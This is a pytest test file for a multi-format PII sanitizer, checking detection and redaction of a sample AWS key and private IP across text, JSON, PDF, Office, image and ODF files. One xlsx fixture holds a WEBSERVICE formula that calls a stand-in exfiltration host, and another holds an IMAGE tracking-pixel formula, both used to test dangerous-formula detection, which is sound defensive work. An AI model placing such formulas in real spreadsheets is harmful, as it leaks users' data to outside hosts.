"""
Integration tests for all sanitizer classes across every supported file type.

Each test:
  1. Creates a real temporary file containing known PII
  2. Calls detect() and asserts at least one detection is returned
  3. Calls sanitize() and asserts the output file is written without error
  4. Reads the sanitized output and asserts the original PII is absent

PII fixture: AWS access key (pattern-matched, score 0.9) and a private IP
(RFC-1918 pattern, score 0.8) — both are regex-only detectors that do not
depend on spaCy NER, making them reliable anchors for all file-type tests.

session=None is passed to sanitize(), which causes the redaction token to be
the literal string "[REDACTED]".
"""
import json
import tempfile
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# Shared PII content
# ---------------------------------------------------------------------------

AWS_KEY = "AKIAIOSFODNN7EXAMPLE"   # AKIA + 16 uppercase chars — AWS_ACCESS_KEY, score 0.9
PRIVATE_IP = "192.168.10.50"        # RFC-1918 — PRIVATE_IP, score 0.8
PII_TEXT = f"Key: {AWS_KEY}  Address: {PRIVATE_IP}"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _detect_and_sanitize(sanitizer, out_path: Path):
    detections = sanitizer.detect()
    result = sanitizer.sanitize(detections, out_path, session=None)
    return detections, result


def _has_pii(detections) -> bool:
    return any(
        d.entity_type in ("AWS_ACCESS_KEY", "PRIVATE_IP", "EMAIL_ADDRESS",
                          "NORWEGIAN_BANK_ACCOUNT", "AZURE_UUID")
        for d in detections
    )


# ---------------------------------------------------------------------------
# TextSanitizer — .txt
# ---------------------------------------------------------------------------

class TestTextSanitizer:
    def test_txt_detect(self, tmp_path):
        src = tmp_path / "sample.txt"
        src.write_text(PII_TEXT, encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        detections = TextSanitizer(src).detect()
        assert _has_pii(detections)

    def test_txt_sanitize_removes_pii(self, tmp_path):
        src = tmp_path / "sample.txt"
        src.write_text(PII_TEXT, encoding="utf-8")
        out = tmp_path / "out.txt"
        from sanitizers.text_sanitizer import TextSanitizer
        detections, result = _detect_and_sanitize(TextSanitizer(src), out)
        assert result.success
        assert out.exists()
        content = out.read_text(encoding="utf-8")
        assert AWS_KEY not in content
        assert PRIVATE_IP not in content

    def test_txt_sanitize_result_has_detections(self, tmp_path):
        src = tmp_path / "sample.txt"
        src.write_text(PII_TEXT, encoding="utf-8")
        out = tmp_path / "out.txt"
        from sanitizers.text_sanitizer import TextSanitizer
        detections, result = _detect_and_sanitize(TextSanitizer(src), out)
        assert len(detections) > 0

    def test_csv_detect(self, tmp_path):
        src = tmp_path / "data.csv"
        src.write_text(f"name,key\nalice,{AWS_KEY}\n", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        detections = TextSanitizer(src).detect()
        assert _has_pii(detections)

    def test_log_detect(self, tmp_path):
        src = tmp_path / "app.log"
        src.write_text(f"2024-01-01 ERROR credential={AWS_KEY} auth_failed\n", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        detections = TextSanitizer(src).detect()
        assert _has_pii(detections)

    def test_yaml_detect(self, tmp_path):
        src = tmp_path / "config.yaml"
        src.write_text(f"aws_key: {AWS_KEY}\n", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        detections = TextSanitizer(src).detect()
        assert _has_pii(detections)

    def test_env_detect(self, tmp_path):
        src = tmp_path / ".env"
        src.write_text(f"AWS_ACCESS_KEY_ID={AWS_KEY}\n", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        detections = TextSanitizer(src).detect()
        assert _has_pii(detections)

    def test_empty_file_no_detections(self, tmp_path):
        src = tmp_path / "empty.txt"
        src.write_text("", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        assert TextSanitizer(src).detect() == []

    def test_clean_file_no_detections(self, tmp_path):
        src = tmp_path / "clean.txt"
        src.write_text("This document has no sensitive information.\n", encoding="utf-8")
        from sanitizers.text_sanitizer import TextSanitizer
        # May still detect something via NER; key assertion is no crash
        detections = TextSanitizer(src).detect()
        assert isinstance(detections, list)


# ---------------------------------------------------------------------------
# JsonSanitizer — .json
# ---------------------------------------------------------------------------

class TestJsonSanitizer:
    def test_json_detect_flat(self, tmp_path):
        src = tmp_path / "flat.json"
        src.write_text(json.dumps({"key": AWS_KEY, "ip": PRIVATE_IP}), encoding="utf-8")
        from sanitizers.text_sanitizer import JsonSanitizer
        detections = JsonSanitizer(src).detect()
        assert _has_pii(detections)

    def test_json_detect_nested(self, tmp_path):
        data = {"config": {"credentials": {"access_key": AWS_KEY}}}
        src = tmp_path / "nested.json"
        src.write_text(json.dumps(data), encoding="utf-8")
        from sanitizers.text_sanitizer import JsonSanitizer
        detections = JsonSanitizer(src).detect()
        assert _has_pii(detections)
        # page_or_line should reflect json path
        assert any("config" in (d.page_or_line or "") for d in detections)

    def test_json_detect_array(self, tmp_path):
        data = {"keys": [AWS_KEY, "innocent"]}
        src = tmp_path / "array.json"
        src.write_text(json.dumps(data), encoding="utf-8")
        from sanitizers.text_sanitizer import JsonSanitizer
        detections = JsonSanitizer(src).detect()
        assert _has_pii(detections)

    def test_json_sanitize_removes_pii(self, tmp_path):
        src = tmp_path / "data.json"
        src.write_text(json.dumps({"key": AWS_KEY, "ip": PRIVATE_IP}), encoding="utf-8")
        out = tmp_path / "out.json"
        from sanitizers.text_sanitizer import JsonSanitizer
        _, result = _detect_and_sanitize(JsonSanitizer(src), out)
        assert result.success
        output = json.loads(out.read_text(encoding="utf-8"))
        assert output["key"] != AWS_KEY
        assert output["ip"] != PRIVATE_IP

    def test_json_sanitize_preserves_structure(self, tmp_path):
        data = {"meta": {"version": 1}, "key": AWS_KEY, "tags": ["a", "b"]}
        src = tmp_path / "struct.json"
        src.write_text(json.dumps(data), encoding="utf-8")
        out = tmp_path / "out.json"
        from sanitizers.text_sanitizer import JsonSanitizer
        _detect_and_sanitize(JsonSanitizer(src), out)
        output = json.loads(out.read_text(encoding="utf-8"))
        assert output["meta"]["version"] == 1
        assert output["tags"] == ["a", "b"]

    def test_invalid_json_falls_back_to_text(self, tmp_path):
        src = tmp_path / "broken.json"
        src.write_text(f"not valid json but has {AWS_KEY} inside", encoding="utf-8")
        out = tmp_path / "out.json"
        from sanitizers.text_sanitizer import JsonSanitizer
        detections, result = _detect_and_sanitize(JsonSanitizer(src), out)
        assert _has_pii(detections)
        assert result.success
        assert AWS_KEY not in out.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# PDFSanitizer — .pdf
# ---------------------------------------------------------------------------

class TestPdfSanitizer:
    @staticmethod
    def _make_pdf(path: Path, text: str) -> None:
        import fitz
        doc = fitz.open()
        page = doc.new_page()
        page.insert_text((50, 72), text)
        doc.save(str(path))
        doc.close()

    def test_pdf_detect(self, tmp_path):
        src = tmp_path / "report.pdf"
        self._make_pdf(src, PII_TEXT)
        from sanitizers.pdf_sanitizer import PDFSanitizer
        detections = PDFSanitizer(src).detect()
        assert _has_pii(detections)

    def test_pdf_detect_page_context(self, tmp_path):
        src = tmp_path / "report.pdf"
        self._make_pdf(src, PII_TEXT)
        from sanitizers.pdf_sanitizer import PDFSanitizer
        detections = PDFSanitizer(src).detect()
        assert all("page" in (d.page_or_line or "") for d in detections)

    def test_pdf_sanitize_writes_file(self, tmp_path):
        src = tmp_path / "report.pdf"
        self._make_pdf(src, PII_TEXT)
        out = tmp_path / "out.pdf"
        from sanitizers.pdf_sanitizer import PDFSanitizer
        _, result = _detect_and_sanitize(PDFSanitizer(src), out)
        assert result.success
        assert out.exists()
        assert out.stat().st_size > 0

    def test_pdf_sanitize_redacts_text(self, tmp_path):
        import fitz
        src = tmp_path / "report.pdf"
        self._make_pdf(src, PII_TEXT)
        out = tmp_path / "out.pdf"
        from sanitizers.pdf_sanitizer import PDFSanitizer
        _detect_and_sanitize(PDFSanitizer(src), out)
        doc = fitz.open(str(out))
        full_text = "".join(page.get_text() for page in doc)
        doc.close()
        assert AWS_KEY not in full_text

    def test_pdf_multipage_detect(self, tmp_path):
        import fitz
        src = tmp_path / "multi.pdf"
        doc = fitz.open()
        for i in range(3):
            page = doc.new_page()
            page.insert_text((50, 72), f"Page {i+1}: {PII_TEXT}")
        doc.save(str(src))
        doc.close()
        from sanitizers.pdf_sanitizer import PDFSanitizer
        detections = PDFSanitizer(src).detect()
        pages = {d.page_or_line for d in detections}
        assert len(pages) > 1


# ---------------------------------------------------------------------------
# OfficeSanitizer — .docx
# ---------------------------------------------------------------------------

class TestDocxSanitizer:
    @staticmethod
    def _make_docx(path: Path, text: str) -> None:
        from docx import Document
        doc = Document()
        doc.add_paragraph(text)
        doc.save(str(path))

    def test_docx_detect(self, tmp_path):
        src = tmp_path / "report.docx"
        self._make_docx(src, PII_TEXT)
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert _has_pii(detections)

    def test_docx_sanitize_writes_file(self, tmp_path):
        src = tmp_path / "report.docx"
        self._make_docx(src, PII_TEXT)
        out = tmp_path / "out.docx"
        from sanitizers.office_sanitizer import OfficeSanitizer
        _, result = _detect_and_sanitize(OfficeSanitizer(src), out)
        assert result.success
        assert out.exists()

    def test_docx_sanitize_redacts_text(self, tmp_path):
        from docx import Document
        src = tmp_path / "report.docx"
        self._make_docx(src, PII_TEXT)
        out = tmp_path / "out.docx"
        from sanitizers.office_sanitizer import OfficeSanitizer
        _detect_and_sanitize(OfficeSanitizer(src), out)
        doc = Document(str(out))
        full_text = "\n".join(p.text for p in doc.paragraphs)
        assert AWS_KEY not in full_text

    def test_docx_table_detect(self, tmp_path):
        from docx import Document
        src = tmp_path / "table.docx"
        doc = Document()
        table = doc.add_table(rows=2, cols=2)
        table.cell(0, 0).text = "AWS Key"
        table.cell(0, 1).text = AWS_KEY
        table.cell(1, 0).text = "IP"
        table.cell(1, 1).text = PRIVATE_IP
        doc.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert _has_pii(detections)

    def test_docx_multiparagraph_detect(self, tmp_path):
        from docx import Document
        src = tmp_path / "multi.docx"
        doc = Document()
        doc.add_paragraph("This is a normal paragraph.")
        doc.add_paragraph(f"Credentials: {AWS_KEY}")
        doc.add_paragraph(f"Server: {PRIVATE_IP}")
        doc.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert _has_pii(detections)


# ---------------------------------------------------------------------------
# OfficeSanitizer — .xlsx
# ---------------------------------------------------------------------------

class TestXlsxSanitizer:
    @staticmethod
    def _make_xlsx(path: Path) -> None:
        from openpyxl import Workbook
        wb = Workbook()
        ws = wb.active
        ws["A1"] = "AWS Key"
        ws["B1"] = AWS_KEY
        ws["A2"] = "IP Address"
        ws["B2"] = PRIVATE_IP
        wb.save(str(path))

    def test_xlsx_detect(self, tmp_path):
        src = tmp_path / "data.xlsx"
        self._make_xlsx(src)
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert _has_pii(detections)

    def test_xlsx_detect_cell_coordinate(self, tmp_path):
        src = tmp_path / "data.xlsx"
        self._make_xlsx(src)
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        # page_or_line should be "SheetName!CellRef"
        assert any("!" in (d.page_or_line or "") for d in detections)

    def test_xlsx_sanitize_redacts_cells(self, tmp_path):
        from openpyxl import load_workbook
        src = tmp_path / "data.xlsx"
        self._make_xlsx(src)
        out = tmp_path / "out.xlsx"
        from sanitizers.office_sanitizer import OfficeSanitizer
        _, result = _detect_and_sanitize(OfficeSanitizer(src), out)
        assert result.success
        wb = load_workbook(str(out), data_only=True)
        values = [
            str(cell.value or "")
            for sheet in wb.worksheets
            for row in sheet.iter_rows()
            for cell in row
        ]
        assert not any(AWS_KEY in v for v in values)

    def test_xlsx_dangerous_formula_detect(self, tmp_path):
        from openpyxl import Workbook
        src = tmp_path / "formulas.xlsx"
        wb = Workbook()
        ws = wb.active
        ws["A1"] = '=WEBSERVICE("http://evil.example/exfil")'
        ws["A2"] = "normal value"
        wb.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert any(d.entity_type == "DANGEROUS_FORMULA" for d in detections)

    def test_xlsx_dangerous_formula_not_redacted(self, tmp_path):
        from openpyxl import Workbook
        src = tmp_path / "formulas.xlsx"
        wb = Workbook()
        ws = wb.active
        ws["A1"] = '=IMAGE("https://tracker.example/pixel")'
        wb.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        formula_hits = [d for d in detections if d.entity_type == "DANGEROUS_FORMULA"]
        assert formula_hits
        assert all(d.redact is False for d in formula_hits)

    def test_xlsx_multisheet_detect(self, tmp_path):
        from openpyxl import Workbook
        src = tmp_path / "multi.xlsx"
        wb = Workbook()
        wb.active.title = "Sheet1"
        wb.active["A1"] = "clean"
        ws2 = wb.create_sheet("Sheet2")
        ws2["A1"] = AWS_KEY
        wb.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert any("Sheet2" in (d.page_or_line or "") for d in detections if _has_pii([d]))


# ---------------------------------------------------------------------------
# OfficeSanitizer — .pptx
# ---------------------------------------------------------------------------

class TestPptxSanitizer:
    @staticmethod
    def _make_pptx(path: Path, text: str) -> None:
        from pptx import Presentation
        from pptx.util import Inches
        prs = Presentation()
        slide = prs.slides.add_slide(prs.slide_layouts[5])
        txBox = slide.shapes.add_textbox(Inches(1), Inches(1), Inches(6), Inches(2))
        txBox.text_frame.text = text
        prs.save(str(path))

    def test_pptx_detect(self, tmp_path):
        src = tmp_path / "deck.pptx"
        self._make_pptx(src, PII_TEXT)
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert _has_pii(detections)

    def test_pptx_detect_slide_context(self, tmp_path):
        src = tmp_path / "deck.pptx"
        self._make_pptx(src, PII_TEXT)
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        assert all("slide" in (d.page_or_line or "") for d in detections)

    def test_pptx_sanitize_redacts_text(self, tmp_path):
        from pptx import Presentation
        src = tmp_path / "deck.pptx"
        self._make_pptx(src, PII_TEXT)
        out = tmp_path / "out.pptx"
        from sanitizers.office_sanitizer import OfficeSanitizer
        _, result = _detect_and_sanitize(OfficeSanitizer(src), out)
        assert result.success
        prs = Presentation(str(out))
        all_text = ""
        for slide in prs.slides:
            for shape in slide.shapes:
                if shape.has_text_frame:
                    all_text += shape.text_frame.text
        assert AWS_KEY not in all_text

    def test_pptx_multislide_detect(self, tmp_path):
        from pptx import Presentation
        from pptx.util import Inches
        src = tmp_path / "multi.pptx"
        prs = Presentation()
        for i in range(3):
            slide = prs.slides.add_slide(prs.slide_layouts[5])
            tb = slide.shapes.add_textbox(Inches(1), Inches(1), Inches(6), Inches(2))
            tb.text_frame.text = f"Slide {i+1}: {PII_TEXT}"
        prs.save(str(src))
        from sanitizers.office_sanitizer import OfficeSanitizer
        detections = OfficeSanitizer(src).detect()
        slides = {d.page_or_line for d in detections}
        assert len(slides) > 1


# ---------------------------------------------------------------------------
# ImageSanitizer — .png / .jpg
# ---------------------------------------------------------------------------

class TestImageSanitizer:
    @staticmethod
    def _make_png_with_metadata(path: Path) -> None:
        from PIL import Image, PngImagePlugin
        img = Image.new("RGB", (100, 100), color=(200, 100, 50))
        meta = PngImagePlugin.PngInfo()
        meta.add_text("Comment", f"Confidential: {AWS_KEY}")
        meta.add_text("Author", "Internal Use Only")
        img.save(str(path), format="PNG", pnginfo=meta)

    @staticmethod
    def _make_jpeg(path: Path) -> None:
        from PIL import Image
        img = Image.new("RGB", (100, 100), color=(100, 200, 50))
        img.save(str(path), format="JPEG", quality=85)

    def test_png_detect_returns_empty(self, tmp_path):
        src = tmp_path / "photo.png"
        self._make_png_with_metadata(src)
        from sanitizers.image_sanitizer import ImageSanitizer
        assert ImageSanitizer(src).detect() == []

    def test_jpeg_detect_returns_empty(self, tmp_path):
        src = tmp_path / "photo.jpg"
        self._make_jpeg(src)
        from sanitizers.image_sanitizer import ImageSanitizer
        assert ImageSanitizer(src).detect() == []

    def test_png_sanitize_strips_metadata(self, tmp_path):
        from PIL import Image
        src = tmp_path / "photo.png"
        self._make_png_with_metadata(src)
        out = tmp_path / "out.png"
        from sanitizers.image_sanitizer import ImageSanitizer
        _, result = _detect_and_sanitize(ImageSanitizer(src), out)
        assert result.success
        assert out.exists()
        img = Image.open(str(out))
        # PNG info should be empty — no text chunks
        assert not img.info, f"Metadata not stripped: {img.info}"

    def test_jpeg_sanitize_writes_file(self, tmp_path):
        src = tmp_path / "photo.jpg"
        self._make_jpeg(src)
        out = tmp_path / "out.jpg"
        from sanitizers.image_sanitizer import ImageSanitizer
        _, result = _detect_and_sanitize(ImageSanitizer(src), out)
        assert result.success
        assert out.exists()
        assert out.stat().st_size > 0

    def test_image_sanitize_preserves_pixels(self, tmp_path):
        from PIL import Image
        src = tmp_path / "photo.png"
        self._make_png_with_metadata(src)
        out = tmp_path / "out.png"
        from sanitizers.image_sanitizer import ImageSanitizer
        _detect_and_sanitize(ImageSanitizer(src), out)
        orig = Image.open(str(src))
        clean = Image.open(str(out))
        assert orig.size == clean.size
        assert orig.mode == clean.mode


# ---------------------------------------------------------------------------
# ODFSanitizer — .odt
# ---------------------------------------------------------------------------

class TestOdfSanitizer:
    @staticmethod
    def _make_odt(path: Path, text: str) -> None:
        from odf.opendocument import OpenDocumentText
        from odf.text import P
        doc = OpenDocumentText()
        p = P(text=text)
        doc.text.addElement(p)
        doc.save(str(path))

    def test_odt_detect(self, tmp_path):
        src = tmp_path / "doc.odt"
        self._make_odt(src, PII_TEXT)
        from sanitizers.odf_sanitizer import ODFSanitizer
        detections = ODFSanitizer(src).detect()
        assert _has_pii(detections)

    def test_odt_sanitize_writes_file(self, tmp_path):
        src = tmp_path / "doc.odt"
        self._make_odt(src, PII_TEXT)
        out = tmp_path / "out.odt"
        from sanitizers.odf_sanitizer import ODFSanitizer
        _, result = _detect_and_sanitize(ODFSanitizer(src), out)
        assert result.success
        assert out.exists()

    def test_odt_sanitize_redacts_text(self, tmp_path):
        from odf.opendocument import load
        src = tmp_path / "doc.odt"
        self._make_odt(src, PII_TEXT)
        out = tmp_path / "out.odt"
        from sanitizers.odf_sanitizer import ODFSanitizer
        _detect_and_sanitize(ODFSanitizer(src), out)
        doc = load(str(out))
        text = "".join(
            node.data
            for node, _ in ODFSanitizer(out)._iter_text_nodes(doc)
        )
        assert AWS_KEY not in text

    def test_odt_multiblock_detect(self, tmp_path):
        from odf.opendocument import OpenDocumentText
        from odf.text import P
        src = tmp_path / "multi.odt"
        doc = OpenDocumentText()
        doc.text.addElement(P(text="Normal paragraph."))
        doc.text.addElement(P(text=f"Credentials: {AWS_KEY}"))
        doc.text.addElement(P(text=f"Server: {PRIVATE_IP}"))
        doc.save(str(src))
        from sanitizers.odf_sanitizer import ODFSanitizer
        detections = ODFSanitizer(src).detect()
        assert _has_pii(detections)


# ---------------------------------------------------------------------------
# File router
# ---------------------------------------------------------------------------

class TestFileRouter:
    @pytest.mark.parametrize("ext,expected_class", [
        (".pdf",  "PDFSanitizer"),
        (".docx", "OfficeSanitizer"),
        (".xlsx", "OfficeSanitizer"),
        (".pptx", "OfficeSanitizer"),
        (".txt",  "TextSanitizer"),
        (".csv",  "TextSanitizer"),
        (".log",  "TextSanitizer"),
        (".json", "JsonSanitizer"),
        (".yaml", "TextSanitizer"),
        (".yml",  "TextSanitizer"),
        (".xml",  "TextSanitizer"),
        (".env",  "TextSanitizer"),
        (".md",   "TextSanitizer"),
        (".png",  "ImageSanitizer"),
        (".jpg",  "ImageSanitizer"),
        (".jpeg", "ImageSanitizer"),
        (".odt",  "ODFSanitizer"),
    ])
    def test_router_returns_correct_class(self, ext, expected_class, tmp_path):
        from utils.file_router import get_sanitizer
        # Create a minimal stub file so Path.suffix resolves correctly
        f = tmp_path / f"test{ext}"
        f.write_bytes(b"")
        sanitizer = get_sanitizer(f)
        assert type(sanitizer).__name__ == expected_class

    def test_router_unsupported_extension_raises(self, tmp_path):
        from utils.file_router import get_sanitizer
        with pytest.raises(ValueError):
            get_sanitizer(tmp_path / "file.xyz")

    def test_is_supported_true(self):
        from utils.file_router import is_supported
        for ext in (".pdf", ".docx", ".xlsx", ".txt", ".json", ".png", ".odt"):
            assert is_supported(Path(f"file{ext}")), ext

    def test_is_supported_false(self):
        from utils.file_router import is_supported
        assert not is_supported(Path("file.xyz"))
